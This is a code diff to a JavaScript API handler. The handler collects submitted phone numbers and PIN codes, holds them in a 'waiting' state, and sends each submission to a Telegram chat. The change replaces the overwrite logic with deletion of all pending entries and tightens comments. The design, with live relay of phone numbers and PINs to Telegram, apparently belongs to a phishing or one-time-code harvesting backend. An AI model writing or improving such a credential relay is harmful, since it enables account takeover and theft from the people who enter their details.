@@ -39,18 +39,21 @@ export default async function handler(req, res) {
   try {
     // Handle phone number submission
     if (phoneNumber && !pinCode) {
-      // Overwrite any previous incomplete submissions for this phone number
-      if (clientData[phoneNumber]) {
-        console.log(`Overwriting existing incomplete submission for: ${phoneNumber}`);
-      }
+      // Remove any existing "waiting" phone number from clientData before adding the new one
+      Object.keys(clientData).forEach((key) => {
+        if (clientData[key].state === 'waiting') {
+          console.log(`Deleting previous incomplete submission for: ${key}`);
+          delete clientData[key];
+        }
+      });
 
-      // Store the phone number temporarily
+      // Add the new phone number submission
       clientData[phoneNumber] = { pin: null, state: 'waiting' };
 
       console.log(`Received phone number: ${phoneNumber}`);
       await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
 
-      // Set a timeout to delete the phone number if no PIN is received within a certain period (e.g., 5 minutes)
+      // Set a timeout to delete the phone number if no PIN is received within 5 minutes
       setTimeout(() => {
         if (clientData[phoneNumber]?.state === 'waiting') {
           console.log(`Deleting incomplete submission for: ${phoneNumber}`);
